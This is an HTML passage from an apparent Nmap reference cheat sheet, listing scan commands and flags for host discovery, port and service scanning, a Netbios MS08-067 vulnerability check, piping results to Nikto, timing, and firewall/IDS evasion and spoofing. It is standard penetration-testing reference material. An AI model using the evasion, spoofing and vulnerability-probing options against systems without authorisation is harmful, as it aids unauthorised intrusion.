  &lt;h5&gt;Agressive scan timings are faster, but could yeild inaccurate results!&lt;/h5&gt;
  &lt;p&gt;T5 uses very aggressive scan timings and could lead to missed ports, T4 is a better compromise if you need fast results.&lt;/p&gt;
&lt;/div&gt;

&lt;h4 id=&quot;nmap-scan-from-file&quot;&gt;Nmap scan from file&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -iL ip-addresses.txt&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Scans a list of IP addresses, you can add options before / after.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;nmap-scan-all-ports&quot;&gt;Nmap Scan all Ports&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -p- target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Nmap scan all ports, TCP ports.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;nmap-output-formats&quot;&gt;Nmap output formats&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Outputs &quot;grepable&quot; output to a file, in this example Netbios servers.&lt;/p&gt;
            &lt;p&gt;E.g, The output file could be grepped for &quot;Open&quot;.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -sS -sV -T5 10.0.1.99 --webxml -oX -&lt;br /&gt; | xsltproc --output file.html -&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Export nmap output to HTML report. &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;nmap-netbios-examples&quot;&gt;Nmap Netbios Examples&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -sV -v -p 139,445 10.0.0.1/24&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Find all Netbios servers on subnet&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -sU --script nbstat.nse -p 137 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Nmap display Netbios name&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap --script-args=unsafe=1 --script &lt;br /&gt; smb-check-vulns.nse -p 445 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Nmap check if Netbios servers are vulnerable to MS08-067&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;div class=&quot;note warning&quot;&gt;
  &lt;h5&gt;--script-args=unsafe=1 has the potential to crash servers / services&lt;/h5&gt;
  &lt;p&gt;Becareful when running this command.&lt;/p&gt;
&lt;/div&gt;

&lt;h4 id=&quot;nmap-nikto-scan&quot;&gt;Nmap Nikto Scan&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -p80 10.0.1.0/24 -oG - | nikto.pl -h -&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Scans for http servers on port 80 and pipes into Nikto for scanning.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -p80,443 10.0.1.0/24 -oG - | nikto.pl -h -&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Scans for http/https servers on port 80, 443 and pipes into Nikto for scanning.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;nmap-cheatsheet&quot;&gt;Nmap Cheatsheet&lt;/h3&gt;

&lt;h4 id=&quot;target-specification&quot;&gt;Target Specification&lt;/h4&gt;

&lt;p&gt;Nmap allows hostnames, IP addresses, subnets.&lt;/p&gt;

&lt;p&gt;Example blah.highon.coffee, nmap.org/24, 192.168.0.1; 10.0.0-255.1-254&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-iL&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;inputfilename: Input from list of hosts/networks&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-iR&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;num hosts: Choose random targets&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--exclude&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;host1[,host2][,host3],... : Exclude hosts/networks&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--excludefile&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;exclude_file: Exclude list from file&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-sL&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;List Scan - simply list targets to scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;   

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-sn&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Nmap ping scan / sweep - runs a nmap network scan, with port scanning disabled&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-Pn&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Treat all hosts as online -- skip host discovery&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-PS/PA/PU/PY[portlist]&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;TCP SYN/ACK, UDP or SCTP discovery to given ports. Allows you to specify a specific port nmap uses to verify a host is up e.g., -PS22 (by default nmap sends to a bunch of common ports, this allows you to be specific)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-PE/PP/PM&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;ICMP echo, timestamp, and netmask request discovery probes&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-PO[protocol list]&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;IP Protocol Ping&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-n/-R&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Never do DNS resolution/Always resolve [default: sometimes]&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;scan-techniques&quot;&gt;Scan Techniques&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-sS&lt;br /&gt;-sT&lt;br /&gt;-sA&lt;br /&gt;-sW&lt;br /&gt;-sM&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;TCP SYN scan&lt;br /&gt;Connect scan&lt;br /&gt;ACK scan&lt;br /&gt;Window scan&lt;br /&gt;Maimon scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-sU&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;UDP Scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-sN&lt;br /&gt;-sF&lt;br /&gt;-sX&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;TCP Null scan&lt;br /&gt;FIN scan&lt;br /&gt;Xmas scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--scanflags&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Customize TCP scan flags&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-sI zombie host[:probeport]&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Idle scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-sY&lt;br /&gt;-sZ&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;SCTP INIT scan&lt;br /&gt;COOKIE-ECHO scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-sO&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;IP protocol scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt; -b &quot;FTP relay host&quot;&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;FTP bounce scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;port-specification-and-scan-order&quot;&gt;Port Specification and Scan Order&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-p&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Specify ports, e.g. -p80,443 or -p1-65535&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-p U:PORT&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Scan UDP ports with Nmap, e.g. -p U:53&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-F&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Fast mode, scans fewer ports than the default scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-r&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Scan ports consecutively - don't randomize&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--top-ports &quot;number&quot;&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Scan &quot;number&quot; most common ports&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--port-ratio &quot;ratio&quot;&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Scan ports more common than &quot;ratio&quot;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;service-version-detection&quot;&gt;Service Version Detection&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-sV&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Probe open ports to determine service/version info&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--version-intensity &quot;level&quot;&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Set from 0 (light) to 9 (try all probes)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--version-light&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Limit to most likely probes (intensity 2)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--version-all&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Try every single probe (intensity 9)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--version-trace&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show detailed version scan activity (for debugging)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;script-scan&quot;&gt;Script Scan&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-sC&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;equivalent to --script=default&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--script=&quot;Lua scripts&quot;&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;&quot;Lua scripts&quot; is a comma separated list of
           directories, script-files or script-categories&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--script-args=n1=v1,[n2=v2,...]&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;provide arguments to scripts&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-script-args-file=filename&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;provide NSE script args in a file&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--script-trace&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show all data sent and received&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--script-updatedb&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Update script database&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--script-help=&quot;Lua scripts&quot;&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show help about scripts&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;os-detection&quot;&gt;OS Detection&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-O&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Enable OS Detection&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--osscan-limit&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Limit OS detection to promising targets&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--osscan-guess&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Guess OS more aggressively&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;timing-and-performance&quot;&gt;Timing and Performance&lt;/h4&gt;

&lt;p&gt;Options which take TIME are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-T 0-5&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Set timing template - higher is faster (less accurate)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--min-hostgroup SIZE &lt;br /&gt;--max-hostgroup SIZE&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Parallel host scan group sizes&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--min-parallelism NUMPROBES &lt;br /&gt;--max-parallelism NUMPROBES&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Probe parallelization&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--min-rtt-timeout TIME&lt;br /&gt;--max-rtt-timeout TIME&lt;br /&gt;--initial-rtt-timeout TIME&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Specifies probe round trip time&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--max-retries TRIES&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Caps number of port scan probe retransmissions&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--host-timeout TIME&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Give up on target after this long&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--scan-delay TIME &lt;br /&gt;--max-scan-delay TIME&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Adjust delay between probes&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--min-rate NUMBER&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Send packets no slower than NUMBER per second&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--max-rate NUMBER&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Send packets no faster than NUMBER per second&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;firewalls-ids-evasion-and-spoofing&quot;&gt;Firewalls IDS Evasion and Spoofing&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-f; --mtu VALUE&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Fragment packets (optionally w/given MTU)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-D decoy1,decoy2,ME&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Cloak a scan with decoys&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-S IP-ADDRESS&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Spoof source address&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-e IFACE&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Use specified interface&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-g PORTNUM&lt;br /&gt;--source-port PORTNUM&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Use given port number&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--proxies url1,[url2],...&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Relay connections through HTTP / SOCKS4 proxies&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--data-length NUM&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Append random data to sent packets&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--ip-options OPTIONS&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Send packets with specified ip options&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--ttl VALUE&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Set IP time to live field&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--spoof-mac ADDR/PREFIX/VENDOR&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Spoof NMAP MAC address&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--badsum&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Send packets with a bogus TCP/UDP/SCTP checksum&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

